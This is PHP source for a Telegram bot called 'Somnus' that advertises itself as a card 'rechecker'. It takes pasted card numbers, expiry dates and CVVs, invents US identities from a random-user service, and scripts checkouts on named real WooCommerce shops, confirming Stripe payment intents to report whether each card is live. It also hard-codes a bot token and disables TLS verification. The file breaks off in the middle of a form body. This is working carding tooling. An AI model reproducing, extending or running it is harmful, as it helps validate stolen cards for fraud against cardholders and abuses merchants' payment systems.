<?php

# Somnus Bot API

///https://api.telegram.org/bot<token>/setwebhook?url=<url>

$botToken = "5042472277:AAFZW8isZk3E7Vn3T3FMOs1UxrGsZgv4umw"; 
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$lastname = $update["message"]["from"]["last_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

date_default_timezone_set('Asia/Manila');
$Date = date('F j, Y, g:i a');
$WDate = date('l \t\h\e jS');





# Info

// <a href="tg://user?id='.$userId.'">'.$firstname.'</a>

# Start Command

if ((strpos($message, "!start") === 0)||(strpos($message, "/start") === 0)){
sendMessage($chatId, 'Hi <b><u><a href="tg://user?id='.$userId.'">'.$firstname.'</a>!</u></b> My name is <a href="tg://user?id=5040470440">Somnus</a>. I am a bot mainly made for rechecking your cards. I am here to make your works easier. I have plenty of gates and you can try them all!%0A%0ATo know my commands, type /cmd and press enter.%0A%0ANote: Please wait patiently when checking, thanks!%0A%0AVisit our site here:%0A<a href="https://cardchecker.info/">House of Clubs [♧] Rechecker Site</a>.');
}

# Commands

elseif ((strpos($message, "!cmd") === 0)||(strpos($message, "/cmd") === 0)){
sendMessage($chatId, "<b>BIN/IIN Lookup:</b> !bin or /bin%0A━━━━━━━━━━━━━%0A<b>CHARGE GATE/S:</b>%0A%0A<b>➥Commonwealth Bank:</b> !cba or /cba%0A<b>➥Woocommerce Payments:</b> !chk or /chk (Maintenance)%0A<b>➥Elavon Converge:</b> !elv or /elv%0A<b>➥Cybersource:</b> !cyb or /cyb%0A<b>➥Buckaroo:</b> !bcm or /bcm [VISA CARDS ONLY]%0A━━━━━━━━━━━━━%0A<b>MISCELLANEOUS GATE/S:</b>%0A%0A<b>➥VBV/MSC Lookup:</b> !vbv or /vbv%0A━━━━━━━━━━━━━%0A%0A<b>[♧] Somnus</b>");
}


# Infos

elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0)){
sendMessage($chatId, "<b>☾ User info of <a href='tg://user?id=$userId'>$firstname</a></b>%0A━━━━━━━━━━━━━━━%0A<b>User ID:</b><code> $userId</code>%0A<b>Firstname:</b> $firstname%0A<b>Username:</b> @$username%0A━━━━━━━━━━━━━━━");
}


# ------------------- [ Maintenance ]--------------------#









# Bin Command

if ((strpos($message, "!bin") === 0)||(strpos($message, "/bin") === 0)){
$bin = substr($message, 5);
$binlength = strlen($bin);
$bind = substr($message, 5,6);
$hehe = substr($message, 5,1);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};




# ----------------- [Bin Scrap ] ---------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://bin-check-dr4g.herokuapp.com/api/'.$bind.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language: en-US,en;q=0.9',
    'Connection: keep-alive',
    'Host: bin-check-dr4g.herokuapp.com',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$Lookup = curl_exec($ch);

$Vendor = getStr($Lookup, '"vendor":"','"');
$CardType = getStr($Lookup, '"type":"','"');
$CardLevel = getStr($Lookup, '"level":"','"');
$Bank = getStr($Lookup, '"bank":"','"');
$Country = getStr($Lookup, '"country":"','"');
$Emoji = getStr($Lookup, '"emoji":"','"');




# ----------------- [ Bin Scrap End ] ---------------------#



if ((preg_match('/\s/',$bin)) || (!$bin) || ($binlength < 6) || ($hehe == 1) ) {
    sendMessage($chatId, "<b>Invalid BIN/IIN!</b>");
}
else {
sendMessage($chatId, "<b>VALID BIN! ✅</b>%0A%0A<b><u>BIN/IIN</u></b> ⇾ <code>$bind</code>%0A%0A<b><u>BIN/IIN Info:</u></b> $Vendor - $CardType - $CardLevel%0A<b><u>Bank:</u></b> $Bank%0A<b><u>Country:</u></b> $Country $Emoji");
}

curl_close($ch);

}







#--------------------- [ Woocoommerce ]-------------------#

if ((strpos($message, "!chk") === 0)||(strpos($message, "/chk") === 0)){
$lista = substr($message, 5);
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
$cvvlength = strlen($cvv);
$yearlength = strlen($ano);
$listalength = strlen($lista);
$banner = substr($message, 5,6);

$cc1 = substr($cc, 0,4);
$cc2 = substr($cc, 4,4);
$cc3 = substr($cc, 8,4);
$cc4 = substr($cc, 12,4);
$cc6 = substr($cc, 0,6);


if(strlen($ano) == 4){
    $ano2 = substr($ano, 2);
    };
if(strlen($mes) == 2){
    $mes1 = substr($mes, 1);
    };




error_reporting(0);
set_time_limit(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$cc1 = substr($cc, 0,4);
$cc2 = substr($cc, 4,4);
$cc3 = substr($cc, 8,4);
$cc4 = substr($cc, 12,4);
$cc6 = substr($cc, 0,6);

$cbin = substr($cc, 0,1);
if($cbin == "5"){
$cbin = "MC";
}else if($cbin == "4"){
$cbin = "VI";
}else if($cbin == "3"){
$cbin = "amex";
}


if(strlen($ano) == 4){
    $ano2 = substr($ano, 2);
    };
if(strlen($mes) == 2){
    $mes1 = substr($mes, 1);
    };

# Session ID
function SID(){
    $data = openssl_random_pseudo_bytes(16);
    $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}


# Formkey
function GetRandomWord($len = 20) {
    $word = array_merge(range('a', 'z'), range('A', 'Z'));
    shuffle($word);
    return substr(implode($word), 0, $len);
}
$rcocks = GetRandomWord();
$Formkey = substr(str_shuffle(mt_rand().mt_rand().$rcocks), 0, 16);



# Randomizing Details

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];



# ----------------- [Bin Scrap ] ---------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://bin-check-dr4g.herokuapp.com/api/'.$cc6.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language: en-US,en;q=0.9',
    'Connection: keep-alive',
    'Host: bin-check-dr4g.herokuapp.com',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$Lookup = curl_exec($ch);

$Vendor = getStr($Lookup, '"vendor":"','"');
$CardType = getStr($Lookup, '"type":"','"');
$CardLevel = getStr($Lookup, '"level":"','"');
$Bank = getStr($Lookup, '"bank":"','"');
$Country = getStr($Lookup, '"country":"','"');
$Emoji = getStr($Lookup, '"emoji":"','"');


curl_close($ch);
# ----------------- [ Bin Scrap End ] ---------------------#



if ((preg_match('/\s/', $lista)) || (!$cc) || (!$mes) || (strlen($cvv) < 3) || (!$cvv) || (!$ano) )  {
sendMessage($chatId, '<b>Invalid Card Format!</b> ❌%0A%0A<b>Format:</b> xxxxxxxxxxxxxxxx|xx|xxxx|xxx%0A%0A<b>Please try again.</b>');
return;
};



$executionStartTime = microtime(true);



# Add to cart

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://erickimphotography.com/blog/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'POST /blog/wp-admin/admin-ajax.php HTTP/2',
    'Host: erickimphotography.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.5br',
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With: XMLHttpRequest',
    'Origin: https://erickimphotography.com',
    'Connection: keep-alive',
    'Referer: https://erickimphotography.com/blog/product/my-first-photography-book/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=astra_add_cart_single_product&add-to-cart=&attribute_edition=Mobile+PDF&quantity=1&add-to-cart=99925&product_id=99925&variation_id=100080');

$Addtocart = curl_exec($ch);
curl_close($ch);


# Checkout

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://erickimphotography.com/blog/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'GET /blog/checkout/ HTTP/2',
    'Host: erickimphotography.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Connection: keep-alive',
    'Referer: https://erickimphotography.com/blog/cart/',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/cookie.txt');

$Checkout = curl_exec($ch);
$CheckoutNonce = trim(strip_tags(getStr($Checkout, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','" />')));
$IntentNonce = trim(strip_tags(getStr($Checkout, '"createPaymentIntentNonce":"','"')));
$Account = trim(strip_tags(getStr($Checkout, '"accountId":"','"')));
$Publishable = trim(strip_tags(getStr($Checkout, '"stripe":{"publishableKey":"','"')));
curl_close($ch);


# Create Intent

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://erickimphotography.com/blog/?wc-ajax=wcpay_create_payment_intent');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'POST /blog/?wc-ajax=wcpay_create_payment_intent HTTP/2',
    'Host: erickimphotography.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.5',
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With: XMLHttpRequest',
    'Origin: https://erickimphotography.com',
    'Connection: keep-alive',
    'Referer: https://erickimphotography.com/blog/checkout/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_ajax_nonce='.$IntentNonce.'');

$CreateIntent = curl_exec($ch);
$PaymentIntent = trim(strip_tags(GetStr($CreateIntent, '"data":{"id":"','"')));
$Secret = trim(strip_tags(GetStr($CreateIntent, '"client_secret":"','"')));
curl_close($ch);


# WcAjaxCheckout

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://erickimphotography.com/blog/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'POST /blog/?wc-ajax=checkout HTTP/2',
    'Host: erickimphotography.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.5',
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With: XMLHttpRequest',
    'Origin: https://erickimphotography.com',
    'Connection: keep-alive',
    'Referer: https://erickimphotography.com/blog/checkout/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Som&billing_last_name=Knows&billing_company=&billing_country=US&billing_address_1=4813+Olive+St&billing_address_2=&billing_city=Commerce+City&billing_state=CO&billing_postcode=80022&billing_phone=4193939123&billing_email=dadawsdwad%40gmail.com&account_username=&account_password=&payment_method=woocommerce_payments&wcpay-payment-method-upe=&wcpay_selected_upe_payment_type=card&wcpay_payment_country=US&woocommerce-process-checkout-nonce='.$CheckoutNonce.'&_wp_http_referer=%2Fblog%2F%3Fwc-ajax%3Dupdate_order_review&wc_payment_intent_id='.$PaymentIntent.'');

$WcAjaxCheckout = curl_exec($ch);
$Redirect = trim(strip_tags(getStr($WcAjaxCheckout, '"redirect_url":"','"')));
$Redirect1 = str_replace('\/', '/', $Redirect);
$RedirectUrl = urlencode($Redirect1);
curl_close($ch);


# Order Confirm

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$PaymentIntent.'/confirm');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: api.stripe.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Accept: application/json',
    'Accept-Language: en-US,en;q=0.5',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://js.stripe.com',
    'Connection: keep-alive',
    'Referer: https://js.stripe.com/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-site',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'return_url=https%3A%2F%2Ferickimphotography.com%2Fblog%2Fcheckout%2Forder-received%2F363135%2F%3Fkey%3Dwc_order_TfpPcBivumnei%26order_id%3D363135%26wc_payment_method%3Dwoocommerce_payments%26_wpnonce%3De7b9d19cbc%26save_payment_method%3Dno&payment_method_data[billing_details][name]=Som+Knows&payment_method_data[billing_details][email]=dadawsdwad%40gmail.com&payment_method_data[billing_details][phone]=4193939123&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=4813+Olive+St&payment_method_data[billing_details][address][line2]=-&payment_method_data[billing_details][address][city]=Commerce+City&payment_method_data[billing_details][address][state]=CO&payment_method_data[billing_details][address][postal_code]=80022&payment_method_data[type]=card&payment_method_data[card][number]='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_year]='.$ano2.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fc562495a3%3B+stripe-js-v3%2Fc562495a3%3B+payment-element&payment_method_data[time_on_page]=63838&payment_method_data[guid]=6859b7e0-275d-437f-a412-ef51cae64a43be49a8&payment_method_data[muid]=8e3d9680-13e3-49f4-80ff-1c989b8f8e4fc50b14&payment_method_data[sid]=8e2f9d23-e8ae-453a-a01b-e5ac2565cfa21f1f81&expected_payment_method_type=card&use_stripe_sdk=true&key='.$Publishable.'&_stripe_account='.$Account.'&client_secret='.$Secret.'');

$OrderConfirm = curl_exec($ch);
$Code = trim(strip_tags(getStr($OrderConfirm, '"code": "','"')));
$DeclineCode = trim(strip_tags(getStr($OrderConfirm, '"decline_code": "','"')));
$Response = trim(strip_tags(getStr($OrderConfirm, '"message": "','"')));


$executionEndTime = microtime(true);
$seconds = $executionEndTime - $executionStartTime;
$TimeTaken = substr($seconds,0,4);


$TotalTime = curl_getinfo($ch)['total_time'];
$Time = substr($TotalTime, 0,4);
curl_close($ch);

// <a href="tg://user?id=$userId">'.$firstname.'</a>


# Responses >


if(strpos($OrderConfirm, '"success"') ) {
sendMessage($chatId, '<b>APPROVED ($10.00)</b> ✅%0A%0A<b><u>CC:</u></b> <code>'.$lista.'</code>%0A<b><u>Gateway ⇾</u></b> Woocommerce Payments%0A<b><u>Response ⇾</u></b> Payment Successful.%0A%0A<b><u>BIN Info ⇾</u></b> '.$Vendor.' - '.$CardType.' - '.$CardLevel.'%0A<b><u>Bank ⇾</u></b> '.$Bank.'%0A<b><u>Country ⇾</u></b> '.$Country.' '.$Emoji.'%0A%0A<b><u>Checked by ⇾</u></b> <a href="tg://user?id=$userId">'.$firstname.'</a>%0A<b><u>Time Taken ⇾</u></b> '.$TimeTaken.' seconds%0A<b><u>Checked on ⇾</u></b> '.$Date.'');
}
elseif (strpos($OrderConfirm, 'Your card has insufficient funds')) {
sendMessage($chatId, '<b>CVV Matched</b> ✅%0A%0A<b><u>CC:</u></b> <code>'.$lista.'</code>%0A<b><u>Gateway ⇾</u></b> Woocommerce Payments%0A<b><u>Response ⇾</u></b> '.$Response.'%0A%0A<b><u>BIN Info ⇾</u></b> '.$Vendor.' - '.$CardType.' - '.$CardLevel.'%0A<b><u>Bank ⇾</u></b> '.$Bank.'%0A<b><u>Country ⇾</u></b> '.$Country.' '.$Emoji.'%0A%0A<b><u>Checked by ⇾</u></b> <a href="tg://user?id=$userId">'.$firstname.'</a>%0A<b><u>Time Taken ⇾</u></b> '.$TimeTaken.' seconds%0A<b><u>Checked on ⇾</u></b> '.$Date.'');
}
else {
sendMessage($chatId, '<b>DECLINED</b> ❌%0A%0A<b><u>CC:</u></b> <code>'.$lista.'</code>%0A<b><u>Gateway</u></b> ⇾ Woocommerce Payments%0A<b><u>Response</u></b> ⇾ '.$Response.' - '.$DeclineCode.'%0A%0A<b><u>BIN Info</u></b> ⇾ '.$Vendor.' - '.$CardType.' - '.$CardLevel.'%0A<b><u>Bank</u></b> ⇾ '.$Bank.'%0A<b><u>Country</u></b>⇾ '.$Country.' '.$Emoji.'%0A%0A<b><u>Checked by:</u></b> <a href="tg://user?id=$userId">'.$firstname.'</a>%0A<b><u>Time Taken:</u></b> '.$TimeTaken.' seconds%0A<b><u>Checked on:</u></b> '.$Date.'');
}

curl_close($ch);
unlink('cookie.txt');

}



#--------------------- [ Migs Commweb ]-------------------#

if ((strpos($message, "!cba") === 0)||(strpos($message, "/cba") === 0)){
$lista = substr($message, 5);
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
$cvvlength = strlen($cvv);
$yearlength = strlen($ano);
$banner = substr($message, 5,6);

$cc1 = substr($cc, 0,4);
$cc2 = substr($cc, 4,4);
$cc3 = substr($cc, 8,4);
$cc4 = substr($cc, 12,4);
$cc6 = substr($cc, 0,6);


if(strlen($ano) == 4){
    $ano2 = substr($ano, 2);
    };
if(strlen($mes) == 2){
    $mes1 = substr($mes, 1);
    };


error_reporting(0);
set_time_limit(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$cc1 = substr($cc, 0,4);
$cc2 = substr($cc, 4,4);
$cc3 = substr($cc, 8,4);
$cc4 = substr($cc, 12,4);
$cc6 = substr($cc, 0,6);

$cbin = substr($cc, 0,1);
if($cbin == "5"){
$cbin = "MASTERCARD";
}else if($cbin == "4"){
$cbin = "VISA";
}else if($cbin == "3"){
$cbin = "Amex";
}


if(strlen($ano) == 4){
    $ano2 = substr($ano, 2);
    };
if(strlen($mes) == 2){
    $mes1 = substr($mes, 1);
    };

# Session ID
function SID(){
    $data = openssl_random_pseudo_bytes(16);
    $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}


# Formkey
function GetRandomWord($len = 20) {
    $word = array_merge(range('a', 'z'), range('A', 'Z'));
    shuffle($word);
    return substr(implode($word), 0, $len);
}
$rcocks = GetRandomWord();
$Formkey = substr(str_shuffle(mt_rand().mt_rand().$rcocks), 0, 16);



# Randomizing Details

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

# ----------------- [Bin Scrap ] ---------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://bin-check-dr4g.herokuapp.com/api/'.$cc6.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language: en-US,en;q=0.9',
    'Connection: keep-alive',
    'Host: bin-check-dr4g.herokuapp.com',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$Lookup = curl_exec($ch);

$Vendor = getStr($Lookup, '"vendor":"','"');
$CardType = getStr($Lookup, '"type":"','"');
$CardLevel = getStr($Lookup, '"level":"','"');
$Bank = getStr($Lookup, '"bank":"','"');
$Country = getStr($Lookup, '"country":"','"');
$Emoji = getStr($Lookup, '"emoji":"','"');


curl_close($ch);
# ----------------- [ Bin Scrap End ] ---------------------#



if ((preg_match('/\s/', $lista)) || (!$cc) || (!$mes) || (strlen($cvv) < 3) || (!$cvv) || (!$ano) )  {
sendMessage($chatId, '<b>Invalid Card Format!</b> ❌%0A%0A<b>Format:</b> xxxxxxxxxxxxxxxx|xx|xxxx|xxx%0A%0A<b>Please try again.</b>');
return;
};



$executionStartTime = microtime(true);



# Add to cart

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.videoconferencingaustralia.com.au/product/poly-voyager-6200-uc-eartips/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'POST /product/poly-voyager-6200-uc-eartips/ HTTP/2',
    'Host: www.videoconferencingaustralia.com.au',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Referer: https://www.videoconferencingaustralia.com.au/product/poly-voyager-6200-uc-eartips/',
    'Content-Type: multipart/form-data; boundary=---------------------------374786044736989103081803385670',
    'Origin: https://www.videoconferencingaustralia.com.au',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="attribute_select-a-version"

Small
-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="quantity"

1
-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="gtm4wp_id"

69815
-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="gtm4wp_name"

Poly Voyager 6200 UC Eartips
-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="gtm4wp_sku"

69815
-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="gtm4wp_category"

Other Accessories
-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="gtm4wp_price"

29
-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="gtm4wp_stocklevel"


-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="add-to-cart"

69815
-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="product_id"

69815
-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="variation_id"

69817
-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="ak_bib"


-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="ak_bfs"

1665564809588
-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="ak_bkpc"

0
-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="ak_bkp"


-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="ak_bmc"

127;1,722;157,2552;
-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="ak_bmcc"

3
-----------------------------374786044736989103081803385670
